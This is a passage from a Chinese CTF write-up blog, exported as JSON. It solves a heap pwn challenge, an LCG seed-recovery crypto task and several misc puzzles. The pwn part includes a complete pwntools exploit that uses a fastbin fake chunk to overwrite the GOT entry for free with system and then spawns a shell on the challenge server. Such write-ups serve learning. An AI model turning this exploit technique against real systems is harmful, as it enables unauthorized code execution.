bin 的地址，可以使 magic &gt; 0x1305</p>\n<p>...</p>\n<p>被坑了。。。</p>\n<p>竟然不是这个目录。。。。。。。。。。。</p>\n<p>然后打算修改一下 system 指令的字符串，发现这个字符串被存在 rodata，只读</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435338/Typera/2023/04/4c2f5f1d77fee1973ed990605f1b4cee.png\" alt=\"image-20230425230855187\" /></p>\n<p>只能重新搞</p>\n<p>想办法控制 heaparray，</p>\n<p>用 fake chunk 修改 heaparray [0] 为 free_got 的地址，然后用 edit () 修改 free_got 为 system 的地址</p>\n<p>接下来就 free 掉一个存了 /bin/sh\\x00 的 chunk，这样就可以 getshell 了，这个可以事先创建好这样的一个 chunk 来实现，然后用 delete_heap 调用 free</p>\n<p>fake chunk 的话，可以再搞两个 chunk，free 第一个 chunk，然后修改另一个造成堆溢出来修改第一个 chunk 的 fd 指针，使其指向 fake chunk</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn4&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>, <span class=\"number\">10003</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">heaparray=<span class=\"number\">0x006020E0</span></span><br><span class=\"line\">fake_fastbin=<span class=\"number\">0x6020ad</span></span><br><span class=\"line\">system_addr=<span class=\"number\">0x400C2C</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;SuccessFul&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx0</span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  </span></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx2 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\"># id3 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0x10</span> * <span class=\"string\">b&#x27;a&#x27;</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>) + p64(<span class=\"number\">0x6020ad</span>) + p64(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;d&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  </span></span><br><span class=\"line\">p=<span class=\"number\">0x23</span> * <span class=\"string\">b&#x27;e&#x27;</span> + p64(free_got)</span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,p)  <span class=\"comment\"># idx4 </span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(<span class=\"number\">0x400C2C</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;Index :&quot;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"lcg\"><a class=\"anchor\" href=\"#lcg\">#</a> lcg</h3>\n<p>参考这个博客，可以直接出<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1cGVycHJpbnRmL2FydGljbGUvZGV0YWlscy8xMDg5NjQ1NjM=\"> https://blog.csdn.net/superprintf/article/details/108964563</span><br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gcd</span>(<span class=\"params\">a,b</span>): </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>): </span><br><span class=\"line\">        <span class=\"keyword\">return</span> a </span><br><span class=\"line\">    <span class=\"keyword\">else</span>: </span><br><span class=\"line\">        <span class=\"keyword\">return</span> gcd(b,a%b) </span><br><span class=\"line\"></span><br><span class=\"line\">s = [<span class=\"number\">64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529</span>, <span class=\"number\">62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683</span>, <span class=\"number\">8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192</span>, <span class=\"number\">67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515</span>, <span class=\"number\">3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684</span>, <span class=\"number\">86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458</span>, <span class=\"number\">74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723</span>, <span class=\"number\">82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903</span>, <span class=\"number\">79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473</span>, <span class=\"number\">70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364</span>]</span><br><span class=\"line\">t = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">    t.append(s[i]-s[i-<span class=\"number\">1</span>]) </span><br><span class=\"line\">all_n = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    all_n.append(gcd((t[i+<span class=\"number\">1</span>]*t[i-<span class=\"number\">1</span>]-t[i]*t[i]), (t[i+<span class=\"number\">2</span>]*t[i]-t[i+<span class=\"number\">1</span>]*t[i+<span class=\"number\">1</span>]))) </span><br><span class=\"line\"></span><br><span class=\"line\">MMI = <span class=\"keyword\">lambda</span> A, n,s=<span class=\"number\">1</span>,t=<span class=\"number\">0</span>,N=<span class=\"number\">0</span>: (n &lt; <span class=\"number\">2</span> <span class=\"keyword\">and</span> t%N <span class=\"keyword\">or</span> MMI(n, A%n, t, s-A//n*t, N <span class=\"keyword\">or</span> n),-<span class=\"number\">1</span>)[n&lt;<span class=\"number\">1</span>] <span class=\"comment\">#逆元计算</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> all_n:</span><br><span class=\"line\">    n=<span class=\"built_in\">abs</span>(n)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n==<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> (n)</span><br><span class=\"line\">    a=(s[<span class=\"number\">2</span>]-s[<span class=\"number\">1</span>])*MMI((s[<span class=\"number\">1</span>]-s[<span class=\"number\">0</span>]),n)%n</span><br><span class=\"line\">    a_phi=MMI(a,n)</span><br><span class=\"line\">    b=(s[<span class=\"number\">1</span>]-a*s[<span class=\"number\">0</span>])%n</span><br><span class=\"line\">    seed = (a_phi*(s[<span class=\"number\">0</span>]-b))%n</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(seed))</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"加密\"><a class=\"anchor\" href=\"#加密\">#</a> 加密？</h3>\n<p>跳舞的小人解出密码：SHERLOCK</p>\n<p>打开后看到一个空白的 txt 文件，查看内码，零宽解出：JKGASwqeeh!@$</p>\n<p>得到这个：63756D746374667B69745F69735F63727970746F3F7D</p>\n<p it_is_crypto?=\"\">base16 解密：cumtctf</p>\n<h3 id=\"社工\"><a class=\"anchor\" href=\"#社工\">#</a> 社工？</h3>\n<p>大意了，WANG/JIA 中间的斜杠还要保留</p>\n<p>去这里扫一下机票上的二维码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">https://demo.dynamsoft.com/barcode-reader/</span></p>\n<p>得到信息：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435349/Typera/2023/04/6761b9a34806e510c91173b2704cebfa.png\" alt=\"image-20230425230905993\" /></p>\n<p>然后去搜一下飞机票二维码的数据信息</p>\n<p>M1 就是旅客姓名</p>\n<p WANGJIA=\"\">flag : cumtctf</p>\n",
            "tags": [
                "Python",
                "CTF",
                "Misc",
                "Pwn"
            ]
        }
    ]
}